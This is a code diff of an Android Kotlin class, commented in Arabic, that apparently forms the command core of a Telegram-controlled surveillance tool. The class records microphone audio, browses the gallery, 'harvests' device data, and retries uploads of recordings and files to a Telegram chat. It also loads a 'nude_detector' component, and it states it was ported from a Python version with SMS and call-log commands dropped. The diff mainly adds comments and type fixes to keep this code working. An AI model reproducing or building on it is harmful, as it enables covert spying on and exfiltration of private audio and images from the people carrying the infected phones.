@@ -16,6 +16,7 @@ import java.security.MessageDigest
 
 /**
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
+ * هذه الفئة هي بديل commands.py مع حذف أوامر SMS وسجل الاتصالات.
  */
 class Commands private constructor(context: Context) {
 
@@ -85,6 +86,9 @@ class Commands private constructor(context: Context) {
             }
         }
 
+        /**
+         * نقطة دخول خارجية لتنفيذ الأوامر
+         */
         fun ex(
             context: Context,
             cmd: String,
@@ -98,12 +102,15 @@ class Commands private constructor(context: Context) {
     }
 
     init {
+        // تنظيف الملفات القديمة عند بدء التشغيل
         cleanupOldFiles()
+        // بدء خيط إعادة المحاولة في الخلفية
         startRetryLoop()
+        // تحميل المهام الفاشلة المحفوظة (سيتم معالجتها في حلقة إعادة المحاولة)
     }
 
     // ============================================================
-    //  دوال مساعدة
+    //  دوال مساعدة: تحميل الإعدادات، إنشاء أسماء فريدة، حذف آمن
     // ============================================================
 
     private fun loadConfig(): MutableMap<String, Any> {
@@ -132,7 +139,8 @@ class Commands private constructor(context: Context) {
 
     private fun saveConfig() {
         try {
-            configFile.writeText(JSONObject(config).toString(2))
+            // ✅ استخدام as Map<*, *> لتجنب مشاكل الأنواع
+            configFile.writeText(JSONObject(config as Map<*, *>).toString(2))
         } catch (e: Exception) {
             Log.e(TAG, "Config save error: ${e.message}")
         }
@@ -201,7 +209,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  التسجيل الصوتي
+    //  التسجيل الصوتي (بديل _record_audio)
     // ============================================================
 
     private suspend fun recordAudio(durationSec: Int = 10): File? =
@@ -286,7 +294,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  إدارة المهام الفاشلة
+    //  إدارة المهام الفاشلة (قائمة انتظار)
     // ============================================================
 
     private fun addTaskToQueue(
@@ -350,6 +358,7 @@ class Commands private constructor(context: Context) {
                 val filename = task.optString("filename")
                 val content = task.optString("content")
 
+                // إذا تجاوز عدد المحاولات الحد الأقصى أو الملف غير موجود
                 if (attempts >= maxRetries) {
                     Log.w(TAG, "Task ${task.optString("id")} exceeded max retries, removing.")
                     safeRemove(File(filePath))
@@ -357,34 +366,40 @@ class Commands private constructor(context: Context) {
                     continue
                 }
 
-                val waitTime = (1L shl attempts) * 60_000L
+                // تأخير أسي
+                val waitTime = (1L shl attempts) * 60_000L // 2^attempts دقيقة
                 if (lastAttempt > 0 && System.currentTimeMillis() - lastAttempt < waitTime) {
                     remainingTasks.put(task)
                     continue
                 }
 
+                // محاولة إعادة الإرسال
                 Log.i(TAG, "Retrying task $type (attempt ${attempts + 1})")
 
                 val success = when (type) {
                     "audio" -> {
                         val file = File(filePath)
                         if (file.exists()) {
-                            false
+                            // محاولة إرسال الصوت عبر tg (سيتم تنفيذها خارجياً)
+                            // نضيف المهمة إلى قائمة الانتظار للتنفيذ الفعلي
+                            false // سنقوم بتنفيذها عبر callback لاحقاً
                         } else {
                             removed++
-                            true
+                            true // حذف المهمة لأن الملف غير موجود
                         }
                     }
                     "text_file" -> {
-                        false
+                        false // سنقوم بتنفيذها عبر callback
                     }
                     else -> false
                 }
 
                 if (success) {
+                    // تمت إعادة المحاولة بنجاح أو تم حذف الملف
                     safeRemove(File(filePath))
                     removed++
                 } else {
+                    // فشلت إعادة المحاولة، نزيد عدد المحاولات ونعيد إضافتها
                     task.put("attempts", attempts + 1)
                     task.put("last_attempt", System.currentTimeMillis())
                     remainingTasks.put(task)
@@ -401,7 +416,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  إرسال الملفات النصية
+    //  إرسال الملفات النصية (بديل _send_text_file)
     // ============================================================
 
     private suspend fun sendTextFile(tg: Any?, chatId: Long, content: String, filename: String) {
@@ -429,6 +444,7 @@ class Commands private constructor(context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Send text file error: ${e.message}")
+            // محاولة إرسال النص مباشرة
             sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}")
             safeRemove(tempFile)
         }
@@ -443,10 +459,12 @@ class Commands private constructor(context: Context) {
             try {
                 if (cmd.isBlank()) return@launch
 
+                // الرد على callback إذا وُجد
                 cbq?.let { queryId ->
                     invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
                 }
 
+                // تحميل المكونات المطلوبة (محاكاة _ensure_components)
                 ensureComponents(m)
 
                 when {
@@ -483,15 +501,20 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  تحميل المكونات
+    //  تحميل المكونات (بديل _ensure_components)
     // ============================================================
 
     private suspend fun ensureComponents(m: Any?) {
         if (m == null) return
+        // هذه الدالة ستقوم بتحميل المكونات المطلوبة إذا لم تكن موجودة
+        // في الإصدار الحالي، نكتفي بالتحقق من وجودها
         try {
+            // التحقق من وجود nude_detector
             val nudeDetector = getModuleComponent(m, "nude_detector")
             if (nudeDetector == null) {
                 Log.w(TAG, "nude_detector not loaded, attempting to load...")
+                // هنا يمكن استدعاء مُنشئ الكلاسات المطلوبة
+                // سيتم تنفيذها لاحقاً عند تحويل المكونات الأخرى
             }
         } catch (e: Exception) {
             Log.e(TAG, "Component check error: ${e.message}")
@@ -527,8 +550,8 @@ class Commands private constructor(context: Context) {
                             "editMessageReplyMarkup",
                             mapOf(
                                 "chat_id" to cid,
-                                "message_id" to lastMid,
-                                "reply_markup" to newKb.toString()
+                                "message_id" to (lastMid ?: 0),
+                                "reply_markup" to (newKb?.toString() ?: "")
                             )
                         )
                     }
@@ -727,6 +750,7 @@ class Commands private constructor(context: Context) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                 val jsonKb = kb?.toString() ?: ""
                 val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
+                // حفظ message_id لمشاكل التنقل
                 val msgId = response?.let { (it as? Map<*, *>)?.get("result")?.let { result ->
                     (result as? Map<*, *>)?.get("message_id")
                 } }
@@ -763,7 +787,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  دوال الانعكاس (Reflection)
+    //  دوال الانعكاس (Reflection) للتعامل مع المكونات الأخرى
     // ============================================================
 
     private fun getModuleComponent(target: Any?, fieldName: String): Any? {
@@ -813,11 +837,11 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  دوال الاتصال بـ Telegram API (مع إصلاح Type Mismatch)
+    //  دوال الاتصال بـ Telegram API
     // ============================================================
 
     /**
-     * ✅ استدعاء دالة Telegram API مع تحويل صريح لحل مشكلة Type Mismatch
+     * ✅ إصلاح السطر 142: تحويل الخريطة إلى HashMap<Any?, Any?> لحل Java Type Mismatch
      */
     private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? {
         if (tg == null) return null
@@ -825,27 +849,22 @@ class Commands private constructor(context: Context) {
             val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
             apiMethod?.isAccessible = true
 
-            // ✅ تحويل صريح للأنواع (Type Cast) لحل Java Type Mismatch
-            @Suppress("UNCHECKED_CAST")
-            val castedParams = params as MutableMap<Any?, Any?>
-
-            apiMethod?.invoke(tg, method, castedParams)
+            // ✅ التحويل الصريح إلى HashMap<Any?, Any?> لحل مشكلة الأنواع الأولية
+            val rawParams = HashMap<Any?, Any?>(params)
+            apiMethod?.invoke(tg, method, rawParams)
         } catch (e: Exception) {
             Log.e(TAG, "Telegram API call error: ${e.message}")
             null
         }
     }
 
-    /**
-     * ✅ إرسال رسالة Telegram مع ضمان عدم وجود null
-     */
     private suspend fun sendTelegramMessage(
         tg: Any?,
         chatId: Any,
         text: String,
         replyMarkupJson: String? = null
     ): Any? {
-        // ✅ استخدام القيم الافتراضية لضمان عدم وجود null
+        // ✅ استخدام القيم الافتراضية لضمان عدم وجود null (إصلاح السطر 528)
         val params = mutableMapOf<String, Any>(
             "chat_id" to chatId,
             "text" to text
